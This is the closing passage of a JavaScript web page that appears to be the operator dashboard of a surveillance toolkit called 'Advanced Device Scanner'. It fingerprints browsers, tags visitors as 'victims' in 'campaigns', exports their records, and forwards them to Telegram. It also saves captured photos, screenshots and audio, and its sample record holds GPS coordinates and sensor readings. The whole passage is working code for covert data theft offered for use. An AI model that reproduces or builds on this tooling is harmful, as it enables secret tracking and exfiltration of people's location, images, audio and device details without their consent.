            return browser;
        }

        function getOSInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown';
            
            if (/windows/i.test(ua)) os = 'Windows';
            else if (/macintosh|mac os x/i.test(ua)) os = 'macOS';
            else if (/android/i.test(ua)) os = 'Android';
            else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
            else if (/linux/i.test(ua)) os = 'Linux';
            
            return os;
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    return {
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
                    };
                }
            } catch (e) {}
            return null;
        }

        function getFontsList() {
            const fonts = [
                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New',
                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS',
                'Verdana', 'Helvetica', 'Tahoma', 'Geneva'
            ];
            
            return fonts.filter(font => {
                return document.fonts.check(`12px "${font}"`);
            });
        }

        function generateVictimID() {
            const timestamp = Date.now();
            const randomStr = Math.random().toString(36).substring(2, 10);
            const userAgentHash = simpleHash(navigator.userAgent).substring(0, 8);
            return `ADV-VICTIM-${timestamp.toString(36).substring(4)}-${randomStr}-${userAgentHash}`;
        }

        function simpleHash(str) {
            let hash = 0;
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return Math.abs(hash).toString(16);
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function getTimeAgo(timestamp) {
            if (!timestamp) return 'Unknown time';
            
            const now = new Date();
            const past = new Date(timestamp);
            const diff = now - past;
            
            const minutes = Math.floor(diff / 60000);
            const hours = Math.floor(diff / 3600000);
            const days = Math.floor(diff / 86400000);
            
            if (minutes < 1) return 'Just now';
            if (minutes < 60) return `${minutes}m ago`;
            if (hours < 24) return `${hours}h ago`;
            if (days < 7) return `${days}d ago`;
            return past.toLocaleDateString();
        }

        function downloadAllData() {
            const data = {
                campaigns: campaignManager.campaigns,
                victims: campaignManager.getVictims(),
                exportedAt: new Date().toISOString()
            };
            
            const dataStr = JSON.stringify(data, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            
            const downloadLink = document.createElement('a');
            downloadLink.href = URL.createObjectURL(dataBlob);
            downloadLink.download = `advanced-scanner-data-${new Date().toISOString().split('T')[0]}.json`;
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            showToast('All data downloaded successfully!', 'success');
        }

        function downloadVictimData(victimId) {
            const victim = victimsData.find(v => v.id === victimId);
            if (!victim) {
                showToast('Victim data not found', 'error');
                return;
            }
            
            const dataStr = JSON.stringify(victim, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            
            const downloadLink = document.createElement('a');
            downloadLink.href = URL.createObjectURL(dataBlob);
            downloadLink.download = `victim-${victim.victimID || victimId}.json`;
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
            
            showToast('Victim data downloaded!', 'success');
        }

        function viewJSON(victimId) {
            const victim = victimsData.find(v => v.id === victimId);
            if (!victim) {
                showToast('Victim data not found', 'error');
                return;
            }
            
            const jsonStr = JSON.stringify(victim, null, 2);
            const newWindow = window.open();
            newWindow.document.write(`<pre>${jsonStr}</pre>`);
        }

        function sendVictimToTelegram(victimId) {
            const victim = victimsData.find(v => v.id === victimId);
            if (!victim) {
                showToast('Victim data not found', 'error');
                return;
            }
            
            showToast('Sending to Telegram...', 'info');
            sendCompleteDataToTelegram(victim, victim.campaignId)
                .then(() => showToast('Sent to Telegram successfully!', 'success'))
                .catch(err => showToast(`Failed to send: ${err.message}`, 'error'));
        }

        function clearAllData() {
            if (confirm('Are you sure you want to clear ALL data? This cannot be undone.')) {
                campaignManager.clearAllData();
                refreshVictimsList();
                updateStatistics();
                showToast('All data cleared', 'warning');
            }
        }

        function testWithSampleData() {
            const sampleVictim = {
                id: 'test_victim_' + Date.now(),
                victimID: 'ADV-TEST-VICTIM-123',
                campaignId: 'test_campaign',
                campaignName: 'Test Advanced Campaign',
                timestamp: new Date().toISOString(),
                deviceInfo: {
                    platform: 'Test Platform',
                    deviceName: 'Test Device',
                    screenResolution: '1920x1080',
                    userAgent: 'Mozilla/5.0 (Test)',
                    language: 'en-US',
                    browser: 'Chrome',
                    os: 'Windows'
                },
                networkInfo: {
                    ipv4: '192.168.1.100',
                    onlineStatus: 'Online',
                    connectionType: '4g'
                },
                locationInfo: {
                    latitude: 40.7128,
                    longitude: -74.0060,
                    accuracy: 50
                },
                sensorData: {
                    accelerometer: { x: 0, y: 0, z: 9.8 },
                    orientation: { alpha: 45, beta: 0, gamma: 0 }
                },
                mediaData: {
                    photos: [],
                    screenshots: [],
                    audioRecordings: []
                }
            };
            
            victimsData.push(sampleVictim);
            campaignManager.saveAllData();
            refreshVictimsList();
            updateStatistics();
            showToast('Test data added', 'info');
        }

        function showToast(message, type = 'info') {
            // Remove existing toasts
            const existingToasts = document.querySelectorAll('.custom-toast');
            existingToasts.forEach(toast => toast.remove());
            
            // Create toast
            const toast = document.createElement('div');
            toast.className = 'custom-toast';
            
            let bgColor = 'bg-primary';
            let icon = 'fas fa-info-circle';
            
            if (type === 'success') {
                bgColor = 'bg-success';
                icon = 'fas fa-check-circle';
            } else if (type === 'error') {
                bgColor = 'bg-danger';
                icon = 'fas fa-exclamation-circle';
            } else if (type === 'warning') {
                bgColor = 'bg-warning';
                icon = 'fas fa-exclamation-triangle';
            } else if (type === 'info') {
                bgColor = 'bg-info';
                icon = 'fas fa-info-circle';
            }
            
            toast.innerHTML = `
                <div class="toast show" role="alert" style="position: fixed; top: 20px; right: 20px; z-index: 9999;">
                    <div class="toast-header ${bgColor} text-white">
                        <i class="${icon} me-2"></i>
                        <strong class="me-auto">Advanced Device Scanner</strong>
                        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="toast"></button>
                    </div>
                    <div class="toast-body">
                        ${message}
                    </div>
                </div>
            `;
            
            document.body.appendChild(toast);
            
            // Auto remove after 5 seconds
            setTimeout(() => {
                if (toast.parentNode) {
                    toast.remove();
                }
            }, 5000);
            
            // Add close button functionality
            const closeBtn = toast.querySelector('.btn-close');
            if (closeBtn) {
                closeBtn.addEventListener('click', () => {
                    toast.remove();
                });
            }
        }

        function savePhoto(photoData) {
            const link = document.createElement('a');
            link.href = photoData;
            link.download = `photo-${Date.now()}.jpg`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            showToast('Photo saved!', 'success');
        }

        function saveScreenshot(screenshotData) {
            const link = document.createElement('a');
            link.href = screenshotData;
            link.download = `screenshot-${Date.now()}.jpg`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            showToast('Screenshot saved!', 'success');
        }

        function saveAudio(audioUrl) {
            const link = document.createElement('a');
            link.href = audioUrl;
            link.download = `audio-${Date.now()}.webm`;
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
            showToast('Audio saved!', 'success');
        }
    </script>
</body>
</html>